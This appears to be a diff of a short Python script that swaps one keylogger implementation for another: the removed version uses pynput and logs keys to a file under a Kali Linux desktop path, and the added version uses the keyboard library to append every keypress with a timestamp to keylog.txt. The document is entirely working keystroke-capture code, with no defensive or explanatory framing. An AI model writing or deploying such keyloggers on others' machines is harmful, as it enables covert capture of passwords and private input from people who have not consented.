@@ -1,20 +1,14 @@
-# pynputkey.py
-import pynput
-from pynput.keyboard import Key, Listener
-import logging
-import os
+import keyboard
+import time
 
-log_dir = "/home/kali/Desktop/log"
-log_file = "keylog.txt"
+def save_to_file(key):
+    with open("keylog.txt", "a") as f:
+        f.write(f"{key} pressed at {time.ctime()}\n")
 
-# Create the log directory if it doesn't exist
-if not os.path.exists(log_dir):
-    os.makedirs(log_dir)
-
-logging.basicConfig(filename=os.path.join(log_dir, log_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-def on_press(key):
-    logging.info(str(key))
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
+try:
+    keyboard.on_press(save_to_file)
+    print("Press Ctrl+C to exit.")
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("\nSee you later!")
